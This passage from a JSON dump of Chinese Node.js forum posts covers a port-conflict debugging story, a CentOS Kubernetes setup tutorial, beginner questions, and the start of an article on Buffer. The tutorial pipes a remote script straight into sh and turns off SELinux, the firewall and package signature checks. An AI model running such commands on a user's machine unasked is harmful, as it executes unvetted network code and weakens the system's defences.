language-JS\"><code>&#x2F;&#x2F;server.js的代码\n&quot;use strict&quot;;\nconst server = require(&quot;http&quot;).createServer();\nserver.listen(4000);\nserver.on(&quot;request&quot;, (req, res)=&gt; {\n    res.end(&quot;别搞node了，转AI吧&quot;);\n});\n</code></pre><p>写完后用Postman测试了一下<br>\n<img src=\"//static.cnodejs.org/Fj1YMBlqA7GYYe2JMLPcK9IHt029\" alt=\"ip_address_issue.jpg\">\n输出一切正常，马上提交推送代码让前端对接。前端拉取代码在本地运行之后发现请求接口会报错，具体表现是：<strong>按照上面截图的方式用Postman调用接口的话一切正常，用手写的程序调用报错</strong>。例如用以下前端代码调用接口就报错</p>\n<pre class=\"prettyprint language-JS\"><code>&#x2F;&#x2F;前端代码\nvar request= new XMLHttpRequest();\nrequest.onreadystatechange = function () {\n    if (request.readyState === 4) {\n        if (request.status === 200) {\n            console.log(request.responseText)\n        } else {\n            console.error(request.status)\n        }\n    }\n}\nrequest.open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:4000&quot;);\nrequest.send();\n</code></pre><p>这让我非常困惑。</p>\n<h2>调试过程</h2>\n<p>这个问题其实不难，仔细的同学可能已经发现代码中的一些问题了，然而由于本人不够细心，在错误的debug方向上越走越远浪费了好些时间。当时我不假思索写了下面的代码来重现问题</p>\n<pre class=\"prettyprint language-JS\"><code>&#x2F;&#x2F;client.js代码\n&quot;use strict&quot;;\nconst client = require(&quot;http&quot;).get(&quot;http:&#x2F;&#x2F;localhost:4000&quot;, res =&gt; {\n    res.setEncoding(&quot;utf8&quot;);\n    res.on(&quot;data&quot;, console.log);\n});\nclient.on(&quot;error&quot;,e=&gt;{\n    console.error(error);\n});\n</code></pre><p>错误输出为</p>\n<pre class=\"prettyprint language-bash\"><code>Error: Parse Error\n    at Socket.socketOnData (VM75 _http_client.js:447)\n    at Socket.emit (VM15 events.js:197)\n    at addChunk (VM65 _stream_readable.js:288)\n    at readableAddChunk (VM65 _stream_readable.js:269)\n    at Socket.Readable.push (VM65 _stream_readable.js:224)\n    at TCP.onStreamRead (VM74 stream_base_commons.js:150)\n</code></pre><p>马上debug进去看看是怎么回事<br>\n<img src=\"//static.cnodejs.org/Fl3mNRXEe50rATT9yZEp_XSDNZmM\" alt=\"ip_address_issue2.jpg\"></p>\n<p>447行的<code>var ret = parser.execute(d);</code>报错，那很明显是服务端发送的数据有问题了，从截图上看<code>d</code>为字符串<code>HEART</code>。这明显不是我的服务端的输出，难不成有另外一个服务跑在4000端口？但如果这样的话会端口冲突，服务端启动会失败更不要说对外服务了，但是Postman请求服务却又是正常的。当时的情况总结就是：</p>\n<ul>\n<li>server.js启动了服务端</li>\n<li>Postman可以正常访问服务端</li>\n<li>client.js不可以正常访问服务端</li>\n</ul>\n<p>上面的情况似乎是矛盾的，我尝试着将server.js停掉，<strong>然后惊奇地发现Postman不能正常访问服务了，但是client.js依然能够接收数据（<code>HEART</code>字符串）然后报错。这表明确实有另外一个服务跑在4000端口</strong>。于是用下面的命令查看是谁</p>\n<pre class=\"prettyprint language-bash\"><code>PS C:\\Users\\hehe&gt; netstat -aon|findstr &quot;4000&quot;\nTCP    127.0.0.1:4000         0.0.0.0:0              LISTENING       4836\n\nPS C:\\Users\\hehe&gt; tasklist|findstr &quot;4836&quot;\nFoxitProtect.exe              4836 Services                   0      6,472 K\n</code></pre><p>原来是FoxiReader的服务占用4000端口造成冲突，改掉server.js监听的端口之后一切正常。<br>\n问题依然解决了，但是我在这个过程中究竟犯了什么错误，为什么会犯这样的错误？为何会出现Postman可以访问但是client.js不能访问的现象？</p>\n<h2>问题所在</h2>\n<p>我犯的错误有以下几个</p>\n<ul>\n<li>在server.js中调用<code>server.listen(4000)</code></li>\n<li>在Postman中基于localhost这个域名去访问服务</li>\n<li>在client.js中基于127.0.0.1去访问服务</li>\n</ul>\n<p>来看看<code>server.listen([port[, host[, backlog]]][, callback])</code>的文档</p>\n<blockquote>\n<p>If host is omitted, the server will accept connections on the unspecified IPv6 address (::) when IPv6 is available, or the unspecified IPv4 address (0.0.0.0) otherwise.</p>\n</blockquote>\n<p><strong>也就是说如果不制定参数<code>host</code>的话，就会使用IPv6的地址(::)或者IPv4的地址(0.0.0.0)</strong>，于是我重新将server.js启动，然后执行命令</p>\n<pre class=\"prettyprint language-bash\"><code> C:\\Users\\hehe&gt; netstat -aon|findstr &quot;4000&quot;\n  TCP    0.0.0.0:4000           0.0.0.0:0              LISTENING       13176\n  TCP    127.0.0.1:4000         0.0.0.0:0              LISTENING       4836\n</code></pre><p>server.js在0.0.0.0上监听4000端口，它和127.0.0.1上监听相同端口的服务是不会冲突的。至此我终于发现了自己知识的盲点，就是我对以下四者的关系混淆不清（工作多年还不清楚这个问题真是令人惭愧，脸红中…）</p>\n<ul>\n<li>localhost（注意这是一个域名）</li>\n<li>127.0.0.1</li>\n<li>0.0.0.0</li>\n<li>本机的真实ip，例如192.168.1.64</li>\n</ul>\n<p>关于它们的详细区别请看这里</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/20778771/what-is-the-difference-between-0-0-0-0-127-0-0-1-and-localhost\">What is the difference between 0.0.0.0, 127.0.0.1 and localhost?</a></li>\n<li><a href=\"https://www.zhihu.com/question/23940717\">localhost、127.0.0.1 和 本机IP 三者的区别</a></li>\n</ul>\n<p>此外必须注意到文档中还提及</p>\n<blockquote>\n<p>All net.Socket are set to SO_REUSEADDR</p>\n</blockquote>\n<p>关于<code>SO_REUSEADDR</code>的讨论请看</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/14388706/socket-options-so-reuseaddr-and-so-reuseport-how-do-they-differ-do-they-mean-t\">Socket options SO_REUSEADDR and SO_REUSEPORT, how do they differ? Do they mean the same across all major operating systems?</a></li>\n<li><a href=\"https://www.cnblogs.com/xybaby/p/7341579.html\">SO_REUSEADDR与SO_REUSEPORT平台差异性与测试</a></li>\n</ul>\n<p>总之这又是一个隐蔽的坑，在不同的操作系统上<code>SO_REUSEADDR</code>具有不同的意义。而在windows上正是因为开启了<code>SO_REUSEADDR</code>才使得0.0.0.0:4000和127.0.0.1:4000不会冲突</p>\n</div>","title":"一个ip地址引起的小问题","last_reply_at":"2019-04-23T02:35:26.659Z","good":false,"top":false,"reply_count":4,"visit_count":1078,"create_at":"2019-04-18T05:16:11.830Z","author":{"loginname":"youth7","avatar_url":"https://avatars2.githubusercontent.com/u/8315732?v=4&s=120"}},{"id":"5b630389b71aedfe4c1266a2","author_id":"5b62fab258db3ccf66a4516b","tab":"ask","content":"<div class=\"markdown-text\"><p>近期在学习node.js，由于自己是初学者，看了《Node.js开发指南》和 《Node.js开发实战》上的一些基础的东西，《深入浅出 Node.js》看起来是很吃力，最近试着用Express开发自己的一个 个人博客系统，刚刚开始，就感觉很吃力，最近就在想该怎么来学习，希望曾经和我有相同问题的朋友解答下我的疑惑，学习路线很迷茫啊。。。</p>\n</div>","title":"node.js的入门（萌新）","last_reply_at":"2019-04-23T02:10:14.994Z","good":false,"top":false,"reply_count":41,"visit_count":5983,"create_at":"2018-08-02T13:13:45.110Z","author":{"loginname":"remembergf","avatar_url":"https://avatars1.githubusercontent.com/u/34055216?v=4&s=120"}},{"id":"5cb7df80a86ae80ce64b07a1","author_id":"5629da22e6a3804c58159198","tab":"share","content":"<div class=\"markdown-text\"><h1>2019-k8s-centos</h1>\n<p>2019最新k8s集群搭建教程 (centos k8s 搭建)\n网上全是要么过时的,要么残缺的,大多数都是2016年,2017年的文档,照着尝试了N次,各种卸了重装,最后centos系统都搞得乱七八糟,各种配置互相冲突,影响,一直在kubeadm init 报错, 后来实在无果,重新安装了centos系统,从头再来</p>\n<p>非常感谢网友@丿陌路灬再见ミ  技术支持和耐心指导</p>\n<ul>\n<li>首先fork我的github到本地</li>\n</ul>\n<pre class=\"prettyprint language-sh\"><code>git clone https:&#x2F;&#x2F;github.com&#x2F;qxl1231&#x2F;2019-k8s-centos.git\ncd 2019-k8s-centos\n</code></pre><ul>\n<li>安装完master后,还要安装下dashboard,请看另一个dashboard的md文档</li>\n</ul>\n<h2>centos7 部署 k8s 集群</h2>\n<h4>安装docker-ce</h4>\n<p><a href=\"https://docs.docker.com/install/linux/docker-ce/centos/\">官方文档</a></p>\n<p><strong>Master、Node节点都需要安装、配置Docker</strong></p>\n<pre class=\"prettyprint language-sh\"><code># 卸载原来的docker\nsudo yum remove docker \\\n                  docker-client \\\n                  docker-client-latest \\\n                  docker-common \\\n                  docker-latest \\\n                  docker-latest-logrotate \\\n                  docker-logrotate \\\n                  docker-engine\n\n# 安装依赖\nsudo yum update -y &amp;&amp; sudo yum install -y yum-utils \\\n  device-mapper-persistent-data \\\n  lvm2\n  \n# 添加官方yum库\nsudo yum-config-manager \\\n    --add-repo \\\n    https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo\n    \n# 安装docker\nsudo yum install docker-ce docker-ce-cli containerd.io\n\n# 查看docker版本\ndocker --version\n\n# 开机启动\nsystemctl enable --now docker\n</code></pre><p>或者使用脚本一键安装</p>\n<pre class=\"prettyprint language-shell\"><code>curl -fsSL &quot;https:&#x2F;&#x2F;get.docker.com&#x2F;&quot; | sh\nsystemctl enable --now docker\n</code></pre><p><strong>修改docker cgroup驱动，与k8s一致，使用systemd</strong></p>\n<pre class=\"prettyprint language-shell\"><code># 修改docker cgroup驱动：native.cgroupdriver=systemd\ncat &gt; &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;EOF\n{\n  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],\n  &quot;log-driver&quot;: &quot;json-file&quot;,\n  &quot;log-opts&quot;: {\n    &quot;max-size&quot;: &quot;100m&quot;\n  },\n  &quot;storage-driver&quot;: &quot;overlay2&quot;,\n  &quot;storage-opts&quot;: [\n    &quot;overlay2.override_kernel_check=true&quot;\n  ]\n}\nEOF\n\nsystemctl restart docker  # 重启使配置生效\n</code></pre><h3>安装 kubelet kubeadm kubectl</h3>\n<p><a href=\"https://kubernetes.io/docs/setup/independent/install-kubeadm/\">官方文档</a></p>\n<p><strong>master、node节点都需要安装kubelet kubeadm kubectl。</strong></p>\n<p><strong>安装kubernetes的时候，需要安装kubelet, kubeadm等包，<a href=\"http://xn--k8syumpackages-u60w655l4vzbes5afu5a328a8bc.cloud.google.com\">但k8s官网给的yum源是packages.cloud.google.com</a>，国内访问不了，此时我们可以使用阿里云的yum仓库镜像。</strong></p>\n<pre class=\"prettyprint language-shell\"><code>cat &lt;&lt;EOF &gt; &#x2F;etc&#x2F;yum.repos.d&#x2F;kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kubernetes&#x2F;yum&#x2F;repos&#x2F;kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kubernetes&#x2F;yum&#x2F;doc&#x2F;yum-key.gpg\n       http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kubernetes&#x2F;yum&#x2F;doc&#x2F;rpm-package-key.gpg\nEOF\n\n# 关闭SElinux\nsetenforce 0\nsed -i &#x27;s&#x2F;^SELINUX=enforcing$&#x2F;SELINUX=permissive&#x2F;&#x27; &#x2F;etc&#x2F;selinux&#x2F;config\n\n# 安装kubelet kubeadm kubectl\nyum install -y kubelet kubeadm kubectl --disableexcludes=kubernetes\n\nsystemctl enable --now kubelet  # 开机启动kubelet\n\n# centos7用户还需要设置路由：\nyum install -y bridge-utils.x86_64\nmodprobe  br_netfilter  # 加载br_netfilter模块，使用lsmod查看开启的模块\ncat &lt;&lt;EOF &gt;  &#x2F;etc&#x2F;sysctl.d&#x2F;k8s.conf\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nEOF\nsysctl --system  # 重新加载所有配置文件\n\nsystemctl disable --now firewalld  # 关闭防火墙\n\n# k8s要求关闭swap  (qxl)\nswapoff -a &amp;&amp; sysctl -w vm.swappiness=0  # 关闭swap\nsed -ri &#x27;&#x2F;^[^#]*swap&#x2F;s@^@#@&#x27; &#x2F;etc&#x2F;fstab  # 取消开机挂载swap\n</code></pre><p><strong>使用虚拟机的可以做完以上步骤后，进行克隆。实验环境为1 Master，2 Node</strong></p>\n<h4>创建集群准备工作</h4>\n<pre class=\"prettyprint language-shell\"><code># Master端：\nkubeadm config images pull # 拉取集群所需镜像，这个需要翻墙\n\n# --- 不能翻墙可以尝试以下办法 ---\nkubeadm config images list # 列出所需镜像\n#(不是一定是下面的,根据实际情况来)\n# 根据所需镜像名字先拉取国内资源\ndocker pull mirrorgooglecontainers&#x2F;kube-apiserver:v1.14.1\ndocker pull mirrorgooglecontainers&#x2F;kube-controller-manager:v1.14.1\ndocker pull mirrorgooglecontainers&#x2F;kube-scheduler:v1.14.1\ndocker pull mirrorgooglecontainers&#x2F;kube-proxy:v1.14.1\ndocker pull mirrorgooglecontainers&#x2F;pause:3.1\ndocker pull mirrorgooglecontainers&#x2F;etcd:3.3.10\ndocker pull coredns&#x2F;coredns:1.3.1  # 这个在mirrorgooglecontainers中没有\n\n# 修改镜像tag\ndocker tag mirrorgooglecontainers&#x2F;kube-apiserver:v1.14.1 k8s.gcr.io&#x2F;kube-apiserver:v1.14.1\ndocker tag mirrorgooglecontainers&#x2F;kube-controller-manager:v1.14.1 k8s.gcr.io&#x2F;kube-controller-manager:v1.14.1\ndocker tag mirrorgooglecontainers&#x2F;kube-scheduler:v1.14.1 k8s.gcr.io&#x2F;kube-scheduler:v1.14.1\ndocker tag mirrorgooglecontainers&#x2F;kube-proxy:v1.14.1 k8s.gcr.io&#x2F;kube-proxy:v1.14.1\ndocker tag mirrorgooglecontainers&#x2F;pause:3.1 k8s.gcr.io&#x2F;pause:3.1\ndocker tag mirrorgooglecontainers&#x2F;etcd:3.3.10 k8s.gcr.io&#x2F;etcd:3.3.10\ndocker tag coredns&#x2F;coredns:1.3.1 k8s.gcr.io&#x2F;coredns:1.3.1\n\n\n# 把所需的镜像下载好，init的时候就不会再拉镜像，由于无法连接google镜像库导致出错\n\n# 删除原来的镜像\ndocker rmi mirrorgooglecontainers&#x2F;kube-apiserver:v1.14.1\ndocker rmi mirrorgooglecontainers&#x2F;kube-controller-manager:v1.14.1\ndocker rmi mirrorgooglecontainers&#x2F;kube-scheduler:v1.14.1\ndocker rmi mirrorgooglecontainers&#x2F;kube-proxy:v1.14.1\ndocker rmi mirrorgooglecontainers&#x2F;pause:3.1\ndocker rmi mirrorgooglecontainers&#x2F;etcd:3.3.10\ndocker rmi coredns&#x2F;coredns:1.3.1\n\n# --- 不能翻墙可以尝试使用 ---\n\n# Node端：\n# 根据所需镜像名字先拉取国内资源\ndocker pull mirrorgooglecontainers&#x2F;kube-proxy:v1.14.1\ndocker pull mirrorgooglecontainers&#x2F;pause:3.1\n\n\n# 修改镜像tag\ndocker tag mirrorgooglecontainers&#x2F;kube-proxy:v1.14.1 k8s.gcr.io&#x2F;kube-proxy:v1.14.1\ndocker tag mirrorgooglecontainers&#x2F;pause:3.1 k8s.gcr.io&#x2F;pause:3.1\n\n# 删除原来的镜像\ndocker rmi mirrorgooglecontainers&#x2F;kube-proxy:v1.14.1\ndocker rmi mirrorgooglecontainers&#x2F;pause:3.1\n# 不加载镜像node节点不能\n</code></pre><h3>使用kubeadm创建集群</h3>\n<pre class=\"prettyprint language-shell\"><code># 第一次初始化过程中&#x2F;etc&#x2F;kubernetes&#x2F;admin.conf该文件存在，是空文件（我自己手动创建的），会报错：panic: runtime error: invalid memory address or nil pointer dereference\nls &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf &amp;&amp; mv &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf.bak # 移走备份\n\n# 初始化Master（Master需要至少2核）此处会各种报错,异常...成功与否就在此\nkubeadm init --apiserver-advertise-address 192.168.200.25 --pod-network-cidr 10.244.0.0&#x2F;16 # --kubernetes-version 1.14.1\n# --apiserver-advertise-address 指定与其它节点通信的接口\n# --pod-network-cidr 指定pod网络子网，使用fannel网络必须使用这个CIDR\n</code></pre><ul>\n<li>运行初始化，程序会检验环境一致性，可以根据实际错误提示进一步修复问题。</li>\n<li>程序会访问https://dl.k8s.io/release/stable-1.txt获取最新的k8s版本，访问这个连接需要FQ，如果无法访问，则会使用kubeadm client的版本作为安装的版本号，使用kubeadm version查看client版本。也可以使用–kubernetes-version明确指定版本。</li>\n</ul>\n<pre class=\"prettyprint\"><code># 初始化结果：\n[init] Using Kubernetes version: v1.14.1\n[preflight] Running pre-flight checks\n[preflight] Pulling images required for setting up a Kubernetes cluster\n[preflight] This might take a minute or two, depending on the speed of your internet connection\n[preflight] You can also perform this action in beforehand using &#x27;kubeadm config images pull&#x27;\n[kubelet-start] Writing kubelet environment file with flags to file &quot;&#x2F;var&#x2F;lib&#x2F;kubelet&#x2F;kubeadm-flags.env&quot;\n[kubelet-start] Writing kubelet configuration to file &quot;&#x2F;var&#x2F;lib&#x2F;kubelet&#x2F;config.yaml&quot;\n[kubelet-start] Activating the kubelet service\n[certs] Using certificateDir folder &quot;&#x2F;etc&#x2F;kubernetes&#x2F;pki&quot;\n[certs] Using existing etcd&#x2F;ca certificate authority\n[certs] Using existing etcd&#x2F;server certificate and key on disk\n[certs] Using existing etcd&#x2F;peer certificate and key on disk\n[certs] Using existing etcd&#x2F;healthcheck-client certificate and key on disk\n[certs] Using existing apiserver-etcd-client certificate and key on disk\n[certs] Using existing ca certificate authority\n[certs] Using existing apiserver certificate and key on disk\n[certs] Using existing apiserver-kubelet-client certificate and key on disk\n[certs] Using existing front-proxy-ca certificate authority\n[certs] Using existing front-proxy-client certificate and key on disk\n[certs] Using the existing &quot;sa&quot; key\n[kubeconfig] Using kubeconfig folder &quot;&#x2F;etc&#x2F;kubernetes&quot;\n[kubeconfig] Writing &quot;admin.conf&quot; kubeconfig file\n[kubeconfig] Writing &quot;kubelet.conf&quot; kubeconfig file\n[kubeconfig] Writing &quot;controller-manager.conf&quot; kubeconfig file\n[kubeconfig] Writing &quot;scheduler.conf&quot; kubeconfig file\n[control-plane] Using manifest folder &quot;&#x2F;etc&#x2F;kubernetes&#x2F;manifests&quot;\n[control-plane] Creating static Pod manifest for &quot;kube-apiserver&quot;\n[control-plane] Creating static Pod manifest for &quot;kube-controller-manager&quot;\n[control-plane] Creating static Pod manifest for &quot;kube-scheduler&quot;\n[etcd] Creating static Pod manifest for local etcd in &quot;&#x2F;etc&#x2F;kubernetes&#x2F;manifests&quot;\n[wait-control-plane] Waiting for the kubelet to boot up the control plane as static Pods from directory &quot;&#x2F;etc&#x2F;kubernetes&#x2F;manifests&quot;. This can take up to 4m0s\n[apiclient] All control plane components are healthy after 21.503375 seconds\n[upload-config] storing the configuration used in ConfigMap &quot;kubeadm-config&quot; in the &quot;kube-system&quot; Namespace\n[kubelet] Creating a ConfigMap &quot;kubelet-config-1.14&quot; in namespace kube-system with the configuration for the kubelets in the cluster\n[upload-certs] Skipping phase. Please see --experimental-upload-certs\n[mark-control-plane] Marking the node master as control-plane by adding the label &quot;node-role.kubernetes.io&#x2F;master=&#x27;&#x27;&quot;\n[mark-control-plane] Marking the node master as control-plane by adding the taints [node-role.kubernetes.io&#x2F;master:NoSchedule]\n[bootstrap-token] Using token: w2i0mh.5fxxz8vk5k8db0wq\n[bootstrap-token] Configuring bootstrap tokens, cluster-info ConfigMap, RBAC Roles\n[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials\n[bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token\n[bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster\n[bootstrap-token] creating the &quot;cluster-info&quot; ConfigMap in the &quot;kube-public&quot; namespace\n[addons] Applied essential addon: CoreDNS\n[addons] Applied essential addon: kube-proxy\n\nYour Kubernetes control-plane has initialized successfully!\n\nTo start using your cluster, you need to run the following as a regular user:\n\n  mkdir -p $HOME&#x2F;.kube\n  sudo cp -i &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf $HOME&#x2F;.kube&#x2F;config\n  sudo chown $(id -u):$(id -g) $HOME&#x2F;.kube&#x2F;config\n\nYou should now deploy a pod network to the cluster.\nRun &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:\n  https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;concepts&#x2F;cluster-administration&#x2F;addons&#x2F;\n\nThen you can join any number of worker nodes by running the following on each as root:\n\n#每个机器创建的master以下部分都不同,需要自己保存好-qxl\nkubeadm join 192.168.200.25:6443 --token our9a0.zl490imi6t81tn5u \\\n    --discovery-token-ca-cert-hash sha256:b93f710eb9b389a69f0cd0d6dcf7c82e389a68f009eb6b2028f69d54b099de16 \n</code></pre><h4>普通用户设置权限</h4>\n<pre class=\"prettyprint language-shell\"><code>  mkdir -p $HOME&#x2F;.kube\n  sudo cp -i &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf $HOME&#x2F;.kube&#x2F;config\n  sudo chown $(id -u):$(id -g) $HOME&#x2F;.kube&#x2F;config\n</code></pre><h4>应用flannel网络</h4>\n<pre class=\"prettyprint language-shell\"><code>kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;coreos&#x2F;flannel&#x2F;master&#x2F;Documentation&#x2F;kube-flannel.yml\n</code></pre><h3>node加入机器</h3>\n<pre class=\"prettyprint language-shell\"><code># node1:\nkubeadm join 192.168.20.5:6443 --token w2i0mh.5fxxz8vk5k8db0wq \\\n    --discovery-token-ca-cert-hash sha256:65e82e987f50908f3640df7e05c7a91f390a02726c9142808faa739d4dc24252 \n# node2:\nkubeadm join 192.168.20.5:6443 --token w2i0mh.5fxxz8vk5k8db0wq \\\n    --discovery-token-ca-cert-hash sha256:65e82e987f50908f3640df7e05c7a91f390a02726c9142808faa739d4dc24252 \n</code></pre><p>输出日志：</p>\n<pre class=\"prettyprint\"><code>[preflight] Running pre-flight checks\n[preflight] Reading configuration from the cluster...\n[preflight] FYI: You can look at this config file with &#x27;kubectl -n kube-system get cm kubeadm-config -oyaml&#x27;\n[kubelet-start] Downloading configuration for the kubelet from the &quot;kubelet-config-1.14&quot; ConfigMap in the kube-system namespace\n[kubelet-start] Writing kubelet configuration to file &quot;&#x2F;var&#x2F;lib&#x2F;kubelet&#x2F;config.yaml&quot;\n[kubelet-start] Writing kubelet environment file with flags to file &quot;&#x2F;var&#x2F;lib&#x2F;kubelet&#x2F;kubeadm-flags.env&quot;\n[kubelet-start] Activating the kubelet service\n[kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap...\n\nThis node has joined the cluster:\n* Certificate signing request was sent to apiserver and a response was received.\n* The Kubelet was informed of the new secure connection details.\n\nRun &#x27;kubectl get nodes&#x27; on the control-plane to see this node join the cluster.\n</code></pre><pre class=\"prettyprint language-shell\"><code># master：\nkubectl get pods --all-namespaces\n# ---输出信息---\nNAMESPACE     NAME                             READY   STATUS    RESTARTS   AGE\nkube-system   coredns-fb8b8dccf-rn8kd          1&#x2F;1     Running   0          170m\nkube-system   coredns-fb8b8dccf-slwr4          1&#x2F;1     Running   0          170m\nkube-system   etcd-master                      1&#x2F;1     Running   0          169m\nkube-system   kube-apiserver-master            1&#x2F;1     Running   0          169m\nkube-system   kube-controller-manager-master   1&#x2F;1     Running   0          169m\nkube-system   kube-flannel-ds-amd64-l8c7c      1&#x2F;1     Running   0          130m\nkube-system   kube-flannel-ds-amd64-lcmxw      1&#x2F;1     Running   1          117m\nkube-system   kube-flannel-ds-amd64-pqnln      1&#x2F;1     Running   1          72m\nkube-system   kube-proxy-4kcqb                 1&#x2F;1     Running   0          170m\nkube-system   kube-proxy-jcqjd                 1&#x2F;1     Running   0          72m\nkube-system   kube-proxy-vm9sj                 1&#x2F;1     Running   0          117m\nkube-system   kube-scheduler-master            1&#x2F;1     Running   0          169m\n# ---输出信息---\n\n\nkubectl get nodes\n# ---输出信息---\nNAME     STATUS   ROLES    AGE    VERSION\nmaster   Ready    master   171m   v1.14.1\nnode1    Ready    &lt;none&gt;   118m   v1.14.1\nnode2    Ready    &lt;none&gt;   74m    v1.14.1\n# ---输出信息---\n</code></pre><p>排错</p>\n<pre class=\"prettyprint language-shell\"><code>journalctl -f  # 当前输出日志\njournalctl -f -u kubelet  # 只看当前的kubelet进程日志\n</code></pre></div>","title":"2019最新k8s集群搭建教程 (centos k8s 搭建)","last_reply_at":"2019-04-23T01:52:59.496Z","good":false,"top":false,"reply_count":10,"visit_count":1268,"create_at":"2019-04-18T02:22:56.623Z","author":{"loginname":"qxl1231","avatar_url":"https://avatars1.githubusercontent.com/u/8305742?v=4&s=120"}},{"id":"5add9ef3a7d228c16b9871c9","author_id":"58d83c586f8b9bf02d1d0b1d","tab":"ask","content":"<div class=\"markdown-text\"><p>前端怎么转node后端\n这是目前个人开发的项目 很菜 只有十几个路由\n目前只也会express+mysql+一堆npm包 写登录token 发验证文件增删查改和爬虫\n想要深入的话要怎么深入才能成为个合格的noder\n前端真的写腻了,怎么转node好 求各位大大指路\n<a href=\"https://github.com/pulessrity/ikan_comic\">https://github.com/pulessrity/ikan_comic</a></p>\n</div>","title":"感觉后端有意思,前端好无聊","last_reply_at":"2019-04-23T01:48:01.628Z","good":false,"top":false,"reply_count":22,"visit_count":4198,"create_at":"2018-04-23T08:53:07.283Z","author":{"loginname":"ResJay","avatar_url":"https://avatars0.githubusercontent.com/u/26635410?v=4&s=120"}},{"id":"5cbd9817a86ae80ce64b1fa2","author_id":"5aa08ffb19b2e3db18959ba1","tab":"ask","content":"<div class=\"markdown-text\"><p>数据是类似这样的数据；\n每一项的数据都是一样的。\n就相当于  iPhone 华为 小米  都属于手机分类一样；\n就是把这个数据 重组一下 逻辑很简单。\n但是遇到一个很诡异的问题。\n<img src=\"//static.cnodejs.org/Fp5DQM5GalpGfJA4ZziP8t9Vomvk\" alt=\"数据.png\"></p>\n<h5>我先上代码</h5>\n<p><img src=\"//static.cnodejs.org/FsRoPuJHBjNAjTA4gPbotenTtMse\" alt=\"代码.png\"></p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; 暂无任何一个机构项\nnew_project_list.push({\n  ins_title: item.ins_title,\n  &#x2F;&#x2F; 问题就在这  添不添加 这个item\n  child: [item]\n});\n</code></pre><h4>添加后的结果</h4>\n<p><img src=\"//static.cnodejs.org/Fu_oaniiqRJ0DymUcPSRs6FkDcf0\" alt=\"添加后的结果.png\"></p>\n<h4>未添加的结果</h4>\n<p><img src=\"//static.cnodejs.org/Ftk9SLRpxqhUsRToK_XAyb981E6B\" alt=\"未添加的结果.png\"></p>\n<h3>求助哟，真心想不通</h3>\n</div>","title":"我得发个问题 求教一下 关于数组操作的","last_reply_at":"2019-04-22T15:36:04.865Z","good":false,"top":false,"reply_count":2,"visit_count":500,"create_at":"2019-04-22T10:31:51.510Z","author":{"loginname":"gek6","avatar_url":"https://avatars2.githubusercontent.com/u/33946481?v=4&s=120"}},{"id":"5cbdc8eda86ae80ce64b20ee","author_id":"5c98426500bcfd7eb2be5add","tab":"share","content":"<div class=\"markdown-text\"><h1>彻底理解Node.js中的Buffer</h1>\n<p>每当在Node.js中遇到<strong>Buffer</strong>,<strong>Stream</strong>和<strong>binary data</strong>之类的单词时，是否总是像我一样感到困惑? 认为它们并不是常用的，而只适合Node.js专家和包开发人员去使用。</p>\n<p>实际上，这些单词是非常重要的，尤其对于用Node.js进行web开发而没有任何CS学位的人员。</p>\n<p>当然，如果你选择继续做一个普通的Node.js开发人员，你可能永远不会直接使用它们。但是如果你想对Node.js的理解提升到下一个级别，那么你确实需要更深入地了解Node的许多核心特性。比如Buffer。这正是我写这篇文章的目的——帮助我们揭开其中一些特性的神秘面纱，并将Node.js的学习带到下一个层次。</p>\n<p>在开始前，先看一下<a href=\"https://nodejs.org/dist/latest-v8.x/docs/api/buffer.html#buffer_buffer\">Node.js官方文档</a>对Buffer的说明</p>\n<blockquote>\n<p>… mechanism for reading or manipulating streams of binary data. The Buffer class was introduced as part of the Node.js API to make it possible to interact with octet streams in the context of things like TCP streams and file system operations.</p>\n</blockquote>\n<p>让我们用简单易懂的语言来重新描述它:</p>\n<pre class=\"prettyprint language-text\"><code>Buffer类作为Node.js API的一部分引入，使操作二进制数据流或与之交互成为可能。\n</code></pre><p>接下来我们更深入的去了解Buffer,streams,binary data。</p>\n<h2>什么是二进制数据</h2>\n<p>你可能已经知道计算机以二进制文件存储和表示数据。二进制就是1和0的集合。例如，下面是5个不同的二进制文件，5组不同的1和0:</p>\n<pre class=\"prettyprint language-text\"><code>10, 01, 001, 1110, 00101011\n</code></pre><p>二进制中每个1和0都称为<strong>Bit</strong>，这是二进制数字的一种简短形式。</p>\n<p>为了存储或表示一段数据，计算机需要将该数据转换为二进制表示。例如，要存储数字12，计算机需要将12转换成二进制表示，即1100。</p>\n<p>但是在工作中，number并不是唯一的数据类型。通常上还会有string,images,videos。计算机知道如何用二进制表示所有的数据类型。比如计算机如何用二进制表示string类型的“L”呢？要将任何字符存储在二进制文件中，计算机首先将该字符转换为数字，然后将该数字转换为二进制表示形式。对于字符串“L”，计算机首先将L转换成表示L的数字。</p>\n<p>打开浏览器控制台，输入“L”. 